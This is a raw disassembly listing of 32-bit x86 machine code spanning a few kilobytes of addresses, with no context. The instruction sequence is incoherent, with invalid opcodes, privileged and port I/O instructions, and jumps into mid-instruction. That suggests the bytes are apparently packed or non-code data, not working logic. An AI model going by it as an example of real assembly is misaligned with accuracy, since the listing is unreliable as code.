  416f3b:	43                   	inc    %ebx
  416f3c:	07                   	pop    %es
  416f3d:	b0 67                	mov    $0x67,%al
  416f3f:	80 24 45 21 d0 42 03 	andb   $0x35,0x342d021(,%eax,2)
  416f46:	35 
  416f47:	6b 14 d4 17          	imul   $0x17,(%esp,%edx,8),%edx
  416f4b:	99                   	cltd
  416f4c:	48                   	dec    %eax
  416f4d:	47                   	inc    %edi
  416f4e:	99                   	cltd
  416f4f:	37                   	aaa
  416f50:	29 f0                	sub    %esi,%eax
  416f52:	68 40 6e 04 24       	push   $0x24046e40
  416f57:	f8                   	clc
  416f58:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  416f59:	78 55                	js     0x416fb0
  416f5b:	f4                   	hlt
  416f5c:	b3 5d                	mov    $0x5d,%bl
  416f5e:	f4                   	hlt
  416f5f:	4b                   	dec    %ebx
  416f60:	75 b4                	jne    0x416f16
  416f62:	60                   	pusha
  416f63:	a3 52 d2 3c 18       	mov    %eax,0x183cd252
  416f68:	82 f0 70             	xor    $0x70,%al
  416f6b:	b8 12 96 05 eb       	mov    $0xeb059612,%eax
  416f70:	03 57 44             	add    0x44(%edi),%edx
  416f73:	58                   	pop    %eax
  416f74:	05 76 37 00 72       	add    $0x72003776,%eax
  416f79:	67 10 93 45 1b       	adc    %dl,0x1b45(%bp,%di)
  416f7e:	c0 2c 5a d1          	shrb   $0xd1,(%edx,%ebx,2)
  416f82:	08 7a 90             	or     %bh,-0x70(%edx)
  416f85:	83 c6 45             	add    $0x45,%esi
  416f88:	fb                   	sti
  416f89:	c3                   	ret
  416f8a:	7e 84                	jle    0x416f10
  416f8c:	ce                   	into
  416f8d:	14 43                	adc    $0x43,%al
  416f8f:	f1                   	int1
  416f90:	48                   	dec    %eax
  416f91:	02 ff                	add    %bh,%bh
  416f93:	34 85                	xor    $0x85,%al
  416f95:	74 d1                	je     0x416f68
  416f97:	81 74 6e 21 90 70 24 	xorl   $0x18247090,0x21(%esi,%ebp,2)
  416f9e:	18 
  416f9f:	16                   	push   %ss
  416fa0:	59                   	pop    %ecx
  416fa1:	b8 69 ea 44 d9       	mov    $0xd944ea69,%eax
  416fa6:	f5                   	cmc
  416fa7:	4c                   	dec    %esp
  416fa8:	ff 70 6c             	push   0x6c(%eax)
  416fab:	12 fc                	adc    %ah,%bh
  416fad:	f8                   	clc
  416fae:	ad                   	lods   %ds:(%esi),%eax
  416faf:	88 2f                	mov    %ch,(%edi)
  416fb1:	8a 5d fb             	mov    -0x5(%ebp),%bl
  416fb4:	53                   	push   %ebx
  416fb5:	76 1b                	jbe    0x416fd2
  416fb7:	be ac d0 96 3e       	mov    $0x3e96d0ac,%esi
  416fbc:	d2 a7 61 8b 16 47    	shlb   %cl,0x47168b61(%edi)
  416fc2:	75 03                	jne    0x416fc7
  416fc4:	83 cf 44             	or     $0x44,%edi
  416fc7:	c6                   	(bad)
  416fc8:	76 83                	jbe    0x416f4d
  416fca:	a0 29 5a ea 77       	mov    0x77ea5a29,%al
  416fcf:	17                   	pop    %ss
  416fd0:	fe                   	(bad)
  416fd1:	6e                   	outsb  %ds:(%esi),(%dx)
  416fd2:	26 2c dd             	es sub $0xdd,%al
  416fd5:	b6 7f                	mov    $0x7f,%dh
  416fd7:	8a 04 8d 04 5e d0 c5 	mov    -0x3a2fa1fc(,%ecx,4),%al
  416fde:	c2 d0 be             	ret    $0xbed0
  416fe1:	ab                   	stos   %eax,%es:(%edi)
  416fe2:	bc 80 7d fb 32       	mov    $0x32fb7d80,%esp
  416fe7:	0f 75 07             	pcmpeqw (%edi),%mm0
  416fea:	00 d2                	add    %dl,%dl
  416fec:	3c 2c                	cmp    $0x2c,%al
  416fee:	3c 61                	cmp    $0x61,%al
  416ff0:	83 fc 48             	cmp    $0x48,%esp
  416ff3:	90                   	nop
  416ff4:	39 84 47 20 57 4e f2 	cmp    %eax,-0xdb1a8e0(%edi,%eax,2)
  416ffb:	bd 6e db 85 07       	mov    $0x785db6e,%ebp
  417000:	de ec                	fsubrp %st,%st(4)
  417002:	68 ff 5b f7 c3       	push   $0xc3f75bff
  417007:	81 17 62 50 a1 40    	adcl   $0x40a15062,(%edi)
  41700d:	b7 8b                	mov    $0x8b,%bh
  41700f:	0a d0                	or     %al,%dl
  417011:	b0 a8                	mov    $0xa8,%al
  417013:	df b1 8d 28 8d 95    	fbstp  -0x6a72d773(%ecx)
  417019:	15 b9 00 3c 72       	adc    $0x723c00b9,%eax
  41701e:	73 cf                	jae    0x416fef
  417020:	52                   	push   %edx
  417021:	ce                   	into
  417022:	fc                   	cld
  417023:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  417024:	96                   	xchg   %eax,%esi
  417025:	14 84                	adc    $0x84,%al
  417027:	40                   	inc    %eax
  417028:	58                   	pop    %eax
  417029:	ec                   	in     (%dx),%al
  41702a:	4c                   	dec    %esp
  41702b:	36 c0 8e f3 37 91 21 	rorb   $0xe3,%ss:0x219137f3(%esi)
  417032:	e3 
  417033:	04 1d                	add    $0x1d,%al
  417035:	ed                   	in     (%dx),%eax
  417036:	37                   	aaa
  417037:	c3                   	ret
  417038:	68 61 8d 51 1b       	push   $0x1b518d61
  41703d:	d2 c4                	rol    %cl,%ah
  41703f:	4f                   	dec    %edi
  417040:	50                   	push   %eax
  417041:	90                   	nop
  417042:	87 d0                	xchg   %edx,%eax
  417044:	84 aa 62 ed 41 bb    	test   %ch,-0x44be129e(%edx)
  41704a:	67 1b 71 3c          	sbb    0x3c(%bx,%di),%esi
  41704e:	04 72                	add    $0x72,%al
  417050:	94                   	xchg   %eax,%esp
  417051:	15 a3 b6 24 50       	adc    $0x5024b6a3,%eax
  417056:	90                   	nop
  417057:	30 42 13             	xor    %al,0x13(%edx)
  41705a:	34 f7                	xor    $0xf7,%al
  41705c:	71 f8                	jno    0x417056
  41705e:	41                   	inc    %ecx
  41705f:	66 be 32 00          	mov    $0x32,%si
  417063:	bb 5f be c4 4c       	mov    $0x4cc4be5f,%ebx
  417068:	3e 96                	ds xchg %eax,%esi
  41706a:	10 35 ec fd 96 f8    	adc    %dh,0xf896fdec
  417070:	3a a2 50 41 14 69    	cmp    0x69144150(%edx),%ah
  417076:	d7                   	xlat   %ds:(%ebx)
  417077:	40                   	inc    %eax
  417078:	72 49                	jb     0x4170c3
  41707a:	88 ff                	mov    %bh,%bh
  41707c:	2d d2 11 23 d9       	sub    $0xd92311d2,%eax
  417081:	31 9b 59 59 02 86    	xor    %ebx,-0x79fda6a7(%ebx)
  417087:	fc                   	cld
  417088:	62 af b1 3d 85 11    	bound  %ebp,0x11853db1(%edi)
  41708e:	27                   	daa
  41708f:	c0 7d f1 a1          	sarb   $0xa1,-0xf(%ebp)
  417093:	a0 7c f4 63 8f       	mov    0x8f63f47c,%al
  417098:	f8                   	clc
  417099:	76 b9                	jbe    0x417054
  41709b:	15 48 97 12 82       	adc    $0x82129748,%eax
  4170a0:	0f 4c 30             	cmovl  (%eax),%esi
  4170a3:	c3                   	ret
  4170a4:	23 3e                	and    (%esi),%edi
  4170a6:	52                   	push   %edx
  4170a7:	14 d6                	adc    $0xd6,%al
  4170a9:	d9 2d 80 06 69 ff    	fldcw  0xff690680
  4170af:	5a                   	pop    %edx
  4170b0:	7c f6                	jl     0x4170a8
  4170b2:	d8 1b                	fcomps (%ebx)
  4170b4:	db 3b                	fstpt  (%ebx)
  4170b6:	00 28                	add    %ch,(%eax)
  4170b8:	06                   	push   %es
  4170b9:	c9                   	leave
  4170ba:	43                   	inc    %ebx
  4170bb:	67 44                	addr16 inc %esp
  4170bd:	85 95 4c f2 7b 33    	test   %edx,0x337bf24c(%ebp)
  4170c3:	d8 86 25 86 02 ad    	fadds  -0x52fd79db(%esi)
  4170c9:	21 13                	and    %edx,(%ebx)
  4170cb:	c8 3c 18 52          	enter  $0x183c,$0x52
  4170cf:	87 1d f6 64 2f 94    	xchg   %ebx,0x942f64f6
  4170d5:	8b cb                	mov    %ebx,%ecx
  4170d7:	1e                   	push   %ds
  4170d8:	1c 14                	sbb    $0x14,%al
  4170da:	58                   	pop    %eax
  4170db:	e1 a8                	loope  0x417085
  4170dd:	b1 0b                	mov    $0xb,%cl
  4170df:	f8                   	clc
  4170e0:	13 a1 13 80 dd 14    	adc    0x14dd8013(%ecx),%esp
  4170e6:	5f                   	pop    %edi
  4170e7:	8a 49 82             	mov    -0x7e(%ecx),%cl
  4170ea:	cd 76                	int    $0x76
  4170ec:	35 8b 03 c6 a2       	xor    $0xa2c6038b,%eax
  4170f1:	96                   	xchg   %eax,%esi
  4170f2:	26 f3 05 d6 08 2e 5b 	es repz add $0x5b2e08d6,%eax
  4170f9:	48                   	dec    %eax
  4170fa:	d5 0a                	aad    $0xa
  4170fc:	20 c3                	and    %al,%bl
  4170fe:	10 01                	adc    %al,(%ecx)
  417100:	2c 72                	sub    $0x72,%al
  417102:	58                   	pop    %eax
  417103:	71 20                	jno    0x417125
  417105:	e7 12                	out    %eax,$0x12
  417107:	52                   	push   %edx
  417108:	18 c5                	sbb    %al,%ch
  41710a:	2c 86                	sub    $0x86,%al
  41710c:	1f                   	pop    %ds
  41710d:	6b 17 08             	imul   $0x8,(%edi),%edx
  417110:	89 ec                	mov    %ebp,%esp
  417112:	a9 e4 6b 24 21       	test   $0x21246be4,%eax
  417117:	90                   	nop
  417118:	53                   	push   %ebx
  417119:	20 b0 86 55 c8 55    	and    %dh,0x55c85586(%eax)
  41711f:	c8 80 87 28          	enter  $0x8780,$0x28
  417123:	61                   	popa
  417124:	81 5c c8 c8 24 5a 84 	sbbl   $0x3c845a24,-0x38(%eax,%ecx,8)
  41712b:	3c 
  41712c:	42                   	inc    %edx
  41712d:	0e                   	push   %cs
  41712e:	2c 87                	sub    $0x87,%al
  417130:	87 57 21             	xchg   %edx,0x21(%edi)
  417133:	2f                   	das
  417134:	23 c3                	and    %ebx,%eax
  417136:	01 88 30 a1 e4 14    	add    %ecx,0x14e4a130(%eax)
  41713c:	08 57 08             	or     %dl,0x8(%edi)
  41713f:	88 94 3d 0b 7a 01 83 	mov    %dl,-0x7cfe85f5(%ebp,%edi,1)
  417146:	13 89 89 2c b9 40    	adc    0x40b92c89(%ecx),%ecx
  41714c:	08 5a 34             	or     %bl,0x34(%edx)
  41714f:	bc 3e d8 01 76       	mov    $0x7601d83e,%esp
  417154:	0d 18 b7 15 c3       	or     $0xc315b718,%eax
  417159:	87 45 61             	xchg   %eax,0x61(%ebp)
  41715c:	48                   	dec    %eax
  41715d:	1d 71 9c 3b f6       	sbb    $0xf63b9c71,%eax
  417162:	76 0d                	jbe    0x417171
  417164:	5a                   	pop    %edx
  417165:	2e f4                	cs hlt
  417167:	82 ff 35             	cmp    $0x35,%bh
  41716a:	1f                   	pop    %ds
  41716b:	05 a4 21 70 bf       	add    $0xbf7021a4,%eax
  417170:	2b 68 34             	sub    0x34(%eax),%ebp
  417173:	10 4a 05             	adc    %cl,0x5(%edx)
  417176:	b5 65                	mov    $0x65,%ch
  417178:	57                   	push   %edi
  417179:	b6 5c                	mov    $0x5c,%dh
  41717b:	30 f9                	xor    %bh,%cl
  41717d:	dc f2                	fdiv   %st,%st(2)
  41717f:	30 a8 94 65 65 1a    	xor    %ch,0x1a656594(%eax)
  417185:	89 61 3d             	mov    %esp,0x3d(%ecx)
  417188:	ac                   	lods   %ds:(%esi),%al
  417189:	41                   	inc    %ecx
  41718a:	63 7c 00 6f          	arpl   %edi,0x6f(%eax,%eax,1)
  41718e:	90                   	nop
  41718f:	ab                   	stos   %eax,%es:(%edi)
  417190:	10 1e                	adc    %bl,(%esi)
  417192:	ad                   	lods   %ds:(%esi),%eax
  417193:	89 ab 38 a0 12 c9    	mov    %ebp,-0x36ed5fc8(%ebx)
  417199:	29 b4 89 03 af 81 c1 	sub    %esi,-0x3e7e50fd(%ecx,%ecx,4)
  4171a0:	d3 57 bb             	rcll   %cl,-0x45(%edi)
  4171a3:	95                   	xchg   %eax,%ebp
  4171a4:	0a c1                	or     %cl,%al
  4171a6:	09 f9                	or     %edi,%ecx
  4171a8:	bd cb 55 d8 bf       	mov    $0xbfd855cb,%ebp
  4171ad:	4a                   	dec    %edx
  4171ae:	9e                   	sahf
  4171af:	06                   	push   %es
  4171b0:	8b 19                	mov    (%ecx),%ebx
  4171b2:	92                   	xchg   %eax,%edx
  4171b3:	ef                   	out    %eax,(%dx)
  4171b4:	51                   	push   %ecx
  4171b5:	44                   	inc    %esp
  4171b6:	9b                   	fwait
  4171b7:	f8                   	clc
  4171b8:	f8                   	clc
  4171b9:	e8 ec 41 0e 3c       	call   0x3c4fb3aa
  4171be:	f8                   	clc
  4171bf:	b1 01                	mov    $0x1,%cl
  4171c1:	2c 94                	sub    $0x94,%al
  4171c3:	d8 78 50             	fdivrs 0x50(%eax)
  4171c6:	85 25 9e e6 c6 92    	test   %esp,0x92c6e69e
  4171cc:	a8 f7                	test   $0xf7,%al
  4171ce:	02 fa                	add    %dl,%bh
  4171d0:	0d 0c 8b af 3c       	or     $0x3caf8b0c,%eax
  4171d5:	58                   	pop    %eax
  4171d6:	37                   	aaa
  4171d7:	92                   	xchg   %eax,%edx
  4171d8:	d8 00                	fadds  (%eax)
  4171da:	e2 4d                	loop   0x417229
  4171dc:	e4 28                	in     $0x28,%al
  4171de:	42                   	inc    %edx
  4171df:	67 38 46 f0          	cmp    %al,-0x10(%bp)
  4171e3:	88 07                	mov    %al,(%edi)
  4171e5:	e7 84                	out    %eax,$0x84
  4171e7:	83 a9 23 9d 10 47 84 	subl   $0xffffff84,0x47109d23(%ecx)
  4171ee:	da 61 90             	fisubl -0x70(%ecx)
  4171f1:	d8 1d 7e ab 14 75    	fcomps 0x7514ab7e
  4171f7:	34 98                	xor    $0x98,%al
  4171f9:	40                   	inc    %eax
  4171fa:	e0 6a                	loopne 0x417266
  4171fc:	21 1f                	and    %ebx,(%edi)
  4171fe:	2d 22 f4 71 d8       	sub    $0xd871f422,%eax
  417203:	64 27                	fs daa
  417205:	a8 4d                	test   $0x4d,%al
  417207:	30 a9 44 43 09 ef    	xor    %ch,-0x10f6bcbc(%ecx)
  41720d:	ac                   	lods   %ds:(%esi),%al
  41720e:	5f                   	pop    %edi
  41720f:	11 d4                	adc    %edx,%esp
  417211:	06                   	push   %es
  417212:	e7 0d                	out    %eax,$0xd
  417214:	c0 20 c2             	shlb   $0xc2,(%eax)
  417217:	b0 8b                	mov    $0x8b,%al
  417219:	58                   	pop    %eax
  41721a:	4b                   	dec    %ebx
  41721b:	58                   	pop    %eax
  41721c:	5e                   	pop    %esi
  41721d:	c2 2c 3a             	ret    $0x3a2c
  417220:	e0 53                	loopne 0x417275
  417222:	db 89 8b 29 b0 ae    	fisttpl -0x514fd675(%ecx)
  417228:	42                   	inc    %edx
  417229:	48                   	dec    %eax
  41722a:	df c8                	(bad)
  41722c:	93                   	xchg   %eax,%ebx
  41722d:	46                   	inc    %esi
  41722e:	c9                   	leave
  41722f:	90                   	nop
  417230:	8b 83 22 8c 25 17    	mov    0x17258c22(%ebx),%eax
  417236:	c9                   	leave
  417237:	55                   	push   %ebp
  417238:	4c                   	dec    %esp
  417239:	50                   	push   %eax
  41723a:	60                   	pusha
  41723b:	25 07 b0 98 29       	and    $0x2998b007,%eax
  417240:	8c 75 15             	mov    %?,0x15(%ebp)
  417243:	72 4a                	jb     0x41728f
  417245:	fb                   	sti
  417246:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  417247:	8c 54 90 4a          	mov    %ss,0x4a(%eax,%edx,4)
  41724b:	4e                   	dec    %esi
  41724c:	81 a3 ac 8c 08 81 b2 	andl   $0x591d83b2,-0x7ef77354(%ebx)
  417253:	83 1d 59 
  417256:	8d 87 1d 83 80 23    	lea    0x2380831d(%edi),%eax
  41725c:	1a 51 fd             	sbb    -0x3(%ecx),%dl
  41725f:	5c                   	pop    %esp
  417260:	ed                   	in     (%dx),%eax
  417261:	c8 36 20 55          	enter  $0x2036,$0x55
  417265:	15 0d 49 60 80       	adc    $0x8060490d,%eax
  41726a:	16                   	push   %ss
  41726b:	07                   	pop    %es
  41726c:	b0 18                	mov    $0x18,%al
  41726e:	53                   	push   %ebx
  41726f:	ae                   	scas   %es:(%edi),%al
  417270:	60                   	pusha
  417271:	8d ab b5 ac a2 10    	lea    0x10a2acb5(%ebx),%ebp
  417277:	8b 83 3c d5 49 9f    	mov    -0x60b62ac4(%ebx),%eax
  41727d:	51                   	push   %ecx
  41727e:	98                   	cwtl
  41727f:	8e b2 19 4f 3d f6    	mov    -0x9c2b0e7(%edx),%?
  417285:	01 a1 0c 51 4e 20    	add    %esp,0x204e510c(%ecx)
  41728b:	88 a3 c2 b8 c1 1a    	mov    %ah,0x1ac1b8c2(%ebx)
  417291:	1d ec a4 54 dc       	sbb    $0xdc54a4ec,%eax
  417296:	4f                   	dec    %edi
  417297:	44                   	inc    %esp
  417298:	ba de 1f 1d 64       	mov    $0x641d1fde,%edx
  41729d:	83 bb 20 66 a3 fb ba 	cmpl   $0xffffffba,-0x45c99e0(%ebx)
  4172a4:	27                   	daa
  4172a5:	5d                   	pop    %ebp
  4172a6:	36 46                	ss inc %esi
  4172a8:	da 24 14             	fisubl (%esp,%edx,1)
  4172ab:	16                   	push   %ss
  4172ac:	5f                   	pop    %edi
  4172ad:	17                   	pop    %ss
  4172ae:	0c de                	or     $0xde,%al
  4172b0:	23 bb d8 55 04 64    	and    0x640455d8(%ebx),%edi
  4172b6:	54                   	push   %esp
  4172b7:	d4 a3                	aam    $0xa3
  4172b9:	ae                   	scas   %es:(%edi),%al
  4172ba:	c2 05 fd             	ret    $0xfd05
  4172bd:	9a ea 40 dd 74 16 7c 	lcall  $0x7c16,$0x74dd40ea
  4172c4:	2c b1                	sub    $0xb1,%al
  4172c6:	09 3d c1 a3 61 7c    	or     %edi,0x7c61a3c1
  4172cc:	b0 b7                	mov    $0xb7,%al
  4172ce:	18 87 6c df c9 7b    	sbb    %al,0x7bc9df6c(%edi)
  4172d4:	10 f8                	adc    %bh,%al
  4172d6:	0b 94 18 f8 79 0f d9 	or     -0x26f08608(%eax,%ebx,1),%edx
  4172dd:	be 93 34 f4 0b       	mov    $0xbf43493,%esi
  4172e2:	b8 18 f4 77 88       	mov    $0x8877f418,%eax
  4172e7:	0f 59 36             	mulps  (%esi),%xmm6
  4172ea:	27                   	daa
  4172eb:	f0 78 0c             	lock js 0x4172fa
  4172ee:	f0 76 30             	lock jbe 0x417321
  4172f1:	1e                   	push   %ds
  4172f2:	b2 7d                	mov    $0x7d,%dl
  4172f4:	27                   	daa
  4172f5:	ec                   	in     (%dx),%al
  4172f6:	0b b4 18 ec 74 c4 21 	or     0x21c474ec(%eax,%ebx,1),%esi
  4172fd:	b2 6c                	mov    $0x6c,%dl
  4172ff:	4e                   	dec    %esi
  417300:	e8 75 48 e8 56       	call   0x5729bb7a
  417305:	e4 21                	in     $0x21,%al
  417307:	50                   	push   %eax
  417308:	0f 20 b8             	mov    %cr7,%eax
  41730b:	f4                   	hlt
  41730c:	b7 8e                	mov    $0x8e,%bh
  41730e:	89 9e 12 f2 85 5f    	mov    %ebx,0x5f85f212(%esi)
  417314:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  417315:	90                   	nop
  417316:	bf 38 34 93 3c       	mov    $0x3c933438,%edi
  41731b:	36 8f a8 53 42       	(bad)
  417320:	24 3a                	and    $0x3a,%al
  417322:	4c                   	dec    %esp
  417323:	02 d6                	add    %dh,%dl
  417325:	21 c9                	and    %ecx,%ecx
  417327:	e6 94                	out    %al,$0x94
  417329:	1d 86 b8 4b 14       	sbb    $0x144bb886,%eax
  41732e:	ac                   	lods   %ds:(%esi),%al
  41732f:	d0 58 f5             	rcrb   $1,-0xb(%eax)
  417332:	5a                   	pop    %edx
  417333:	c8 32 00 47          	enter  $0x32,$0x47
  417337:	38 14 92             	cmp    %dl,(%edx,%edx,4)
  41733a:	0a 4e 3d             	or     0x3d(%esi),%cl
  41733d:	8f                   	(bad)
  41733e:	d3 1c 90             	rcrl   %cl,(%eax,%edx,4)
  417341:	c1 4e fb 8b          	rorl   $0x8b,-0x5(%esi)
  417345:	8e 24 e1             	mov    (%ecx,%eiz,8),%fs
  417348:	e4 85                	in     $0x85,%al
  41734a:	ec                   	in     (%dx),%al
  41734b:	de 1f                	ficomps (%edi)
  41734d:	b8 28 e1 57 b9       	mov    $0xb957e128,%eax
  417352:	0b 20                	or     (%eax),%esp
  417354:	e1 fe                	loope  0x417354
  417356:	f3 48                	repz dec %eax
  417358:	8e 95 24 e1 a5 ab    	mov    -0x545a1edc(%ebp),%ss
  41735e:	a9 b2 b8 bb af       	test   $0xafbbb8b2,%eax
  417363:	50                   	push   %eax
  417364:	ff a1 55 a5 a7 af    	jmp    *-0x50585aab(%ecx)
  41736a:	bb ad b2 18 0c       	mov    $0xc18b2ad,%ebx
  41736f:	7d f6                	jge    0x417367
  417371:	8f                   	(bad)
  417372:	fd                   	std
  417373:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  417374:	b0 a5                	mov    $0xa5,%al
  417376:	bb 9d 99 0a b1       	mov    $0xb10a999d,%ebx
  41737b:	b3 b2                	mov    $0xb2,%bl
  41737d:	ad                   	lods   %ds:(%esi),%eax
  41737e:	b8 b3 b6 23 ba       	mov    $0xba23b6b3,%eax
  417383:	b4 b1                	mov    $0xb1,%ah
  417385:	07                   	pop    %es
  417386:	1b b6 8c 08 a9 b2    	sbb    -0x4d56f774(%esi),%esi
  41738c:	11 32                	adc    %esi,(%edx)
  41738e:	aa                   	stos   %al,%es:(%edi)
  41738f:	91                   	xchg   %eax,%ecx
  417390:	31 f7                	xor    %esi,%edi
  417392:	c1 b6 b7 26 b4 4b b4 	shll   $0xb4,0x4bb426b7(%esi)
  417399:	ba bc a8 4d 0c       	mov    $0xc4da8bc,%edx
  41739e:	d9 f6                	fdecstp
  4173a0:	d8 bb b4 23 b6 b3    	fdivrs -0x4c49dc4c(%ebx)
  4173a6:	bc bd 0c ba a6       	mov    $0xa6ba0cbd,%esp
  4173ab:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4173ac:	4f                   	dec    %edi
  4173ad:	b7 30                	mov    $0x30,%bh
  4173af:	fd                   	std
  4173b0:	b1 dd                	mov    $0xdd,%cl
  4173b2:	ed                   	in     (%dx),%eax
  4173b3:	b7 b1                	mov    $0xb1,%bh
  4173b5:	3a 90 c3 1d a7 a7    	cmp    -0x5858e23d(%eax),%dl
  4173bb:	10 ab a6 b4 b3 b0    	adc    %ch,-0x4f4c4b5a(%ebx)
  4173c1:	b0 76                	mov    $0x76,%al
  4173c3:	1b 73 8f             	sbb    -0x71(%ebx),%esi
  4173c6:	0a b8 a5 b9 77 0a    	or     0xa77b9a5(%eax),%bh
  4173cc:	be 07 a9 a5 8e       	mov    $0x8ea5a907,%esi
  4173d1:	f6 df                	neg    %bh
  4173d3:	ec                   	in     (%dx),%al
  4173d4:	d9 b6 78 ba b7 17    	fnstenv 0x17b7ba78(%esi)
  4173da:	79 af                	jns    0x41738b
  4173dc:	b7 a9                	mov    $0xa9,%bh
  4173de:	b6 ba                	mov    $0xba,%dh
  4173e0:	5e                   	pop    %esi
  4173e1:	b0 d8                	mov    $0xd8,%al
  4173e3:	b3 b7                	mov    $0xb7,%bl
  4173e5:	04 b7                	add    $0xb7,%al
  4173e7:	bb aa aa b4 aa       	mov    $0xaab4aaaa,%ebx
  4173ec:	d0 0c 9b             	rorb   $1,(%ebx,%ebx,4)
  4173ef:	7d d8                	jge    0x4173c9
  4173f1:	df 1f                	fistps (%edi)
  4173f3:	ad                   	lods   %ds:(%esi),%eax
  4173f4:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4173f5:	a9 0e b8 b6 a5       	test   $0xa5b6b80e,%eax
  4173fa:	84 66 cd             	test   %ah,-0x33(%esi)
  4173fd:	da 07                	fiaddl (%edi)
  4173ff:	76 b6                	jbe    0x4173b7
  417401:	b8 d6 a7 b4 a8       	mov    $0xa8b4a7d6,%eax
  417406:	f0 36 6c             	lock ss insb (%dx),%es:(%edi)
  417409:	db 96 d0 60 ac 06    	fistl  0x6ac60d0(%esi)
  41740f:	0c a9                	or     $0xa9,%al
  417411:	ae                   	scas   %es:(%edi),%al
  417412:	b1 24                	mov    $0x24,%cl
  417414:	15 2a d8 ff bb       	adc    $0xbbffd82a,%eax
  417419:	a9 a6 b7 a7 a5       	test   $0xa5a7b7a6,%eax
  41741e:	b2 bc                	mov    $0xbc,%dl
  417420:	18 f8                	sbb    %bh,%al
  417422:	f6 3e                	idivb  (%esi)
  417424:	7b 9f                	jnp    0x4173c5
  417426:	30 b8 a7 b1 40 93    	xor    %bh,-0x6cbf4e59(%eax)
  41742c:	b0 b3                	mov    $0xb3,%al
  41742e:	ab                   	stos   %eax,%es:(%edi)
  41742f:	74 55                	je     0x417486
  417431:	ec                   	in     (%dx),%al
  417432:	db b3 7f b1 ab b6    	(bad) -0x49544e81(%ebx)
  417438:	a8 ad                	test   $0xad,%al
  41743a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41743b:	ad                   	lods   %ds:(%esi),%eax
  41743c:	b6 b9                	mov    $0xb9,%dh
  41743e:	c2 b9 b2             	ret    $0xb2b9
  417441:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  417442:	ac                   	lods   %ds:(%esi),%al
  417443:	c4 09                	les    (%ecx),%ecx
  417445:	4b                   	dec    %ebx
  417446:	76 38                	jbe    0x417480
  417448:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  417449:	1c f3                	sbb    $0xf3,%al
  41744b:	81 29 68 b1 e5 a7    	subl   $0xa7e5b168,(%ecx)
  417451:	aa                   	stos   %al,%es:(%edi)
  417452:	ab                   	stos   %eax,%es:(%edi)
  417453:	be 0a 3d ef db       	mov    $0xdbef3d0a,%esi
  417458:	9e                   	sahf
  417459:	3d 61 b4 2d b6       	cmp    $0xb62db461,%eax
  41745e:	bb 86 b6 a7 c7       	mov    $0xc7a7b686,%ebx
  417463:	b0 0a                	mov    $0xa,%al
  417465:	83 7d b0 07          	cmpl   $0x7,-0x50(%ebp)
  417469:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41746a:	a8 b1                	test   $0xb1,%al
  41746c:	47                   	inc    %edi
  41746d:	b7 b4                	mov    $0xb4,%bh
  41746f:	ac                   	lods   %ds:(%esi),%al
  417470:	ad                   	lods   %ds:(%esi),%eax
  417471:	9b                   	fwait
  417472:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  417473:	9b                   	fwait
  417474:	25 7b 86 b0 ca       	and    $0xcab0867b,%eax
  417479:	f6 0c 9c 2d          	testb  $0x2d,(%esp,%ebx,4)
  41747d:	6f                   	outsl  %ds:(%esi),(%dx)
  41747e:	21 64 6f b4          	and    %esp,-0x4c(%edi,%ebp,2)
  417482:	4c                   	dec    %esp
  417483:	57                   	push   %edi
  417484:	46                   	inc    %esi
  417485:	ab                   	stos   %eax,%es:(%edi)
  417486:	50                   	push   %eax
  417487:	bc 61 85 85 90       	mov    $0x90858561,%esp
  41748c:	0d b7 72 1c dc       	or     $0xdc1c72b7,%eax
  417491:	66 83 b5 27 a4 b0 b9 	xorw   $0x59,-0x464f5bd9(%ebp)
  417498:	59 
  417499:	96                   	xchg   %eax,%esi
  41749a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  41749b:	32 f0                	xor    %al,%dh
  41749d:	33 b7 f0 09 fe b8    	xor    -0x4701f610(%edi),%esi
  4174a3:	dc 84 ad b1 b1 b9 2f 	faddl  0x2fb9b1b1(%ebp,%ebp,4)
  4174aa:	b4 64                	mov    $0x64,%ah
  4174ac:	cf                   	iret
  4174ad:	2f                   	das
  4174ae:	40                   	inc    %eax
  4174af:	fa                   	cli
  4174b0:	ea 5a a8 b3 bb d0 0e 	ljmp   $0xed0,$0xbbb3a85a
  4174b7:	c2 67 9a             	ret    $0x9a67
  4174ba:	ba a9 b8 4e b1       	mov    $0xb14eb8a9,%edx
  4174bf:	bb 56 c1 70 85       	mov    $0x8570c156,%ebx
  4174c4:	83 02 a9             	addl   $0xffffffa9,(%edx)
  4174c7:	aa                   	stos   %al,%es:(%edi)
  4174c8:	b7 bd                	mov    $0xbd,%bh
  4174ca:	08 e7                	or     %ah,%bh
  4174cc:	b6 15                	mov    $0x15,%dh
  4174ce:	dc ab af 40 00 11    	fsubrl 0x110040af(%ebx)
  4174d4:	b2 41                	mov    $0x41,%dl
  4174d6:	97                   	xchg   %eax,%edi
  4174d7:	92                   	xchg   %eax,%edx
  4174d8:	37                   	aaa
  4174d9:	db ce                	fcmovne %st(6),%st
  4174db:	66 0c 62             	data16 or $0x62,%al
  4174de:	b2 a3                	mov    $0xa3,%dl
  4174e0:	bb 41 ad 5b 9b       	mov    $0x9b5bad41,%ebx
  4174e5:	0d 42 bc b8 9d       	or     $0x9db8bc42,%eax
  4174ea:	ec                   	in     (%dx),%al
  4174eb:	4f                   	dec    %edi
  4174ec:	af                   	scas   %es:(%edi),%eax
  4174ed:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4174ee:	b0 bf                	mov    $0xbf,%al
  4174f0:	42                   	inc    %edx
  4174f1:	6b b9 99 3c 1c b5 b9 	imul   $0xffffffb9,-0x4ae3c367(%ecx),%edi
  4174f8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4174f9:	33 f1                	xor    %ecx,%esi
  4174fb:	ac                   	lods   %ds:(%esi),%al
  4174fc:	15 5a 21 1a c6       	adc    $0xc61a215a,%eax
  417501:	0b ba a7 93 35 6c    	or     0x6c3593a7(%edx),%edi
  417507:	83 cb b2             	or     $0xffffffb2,%ebx
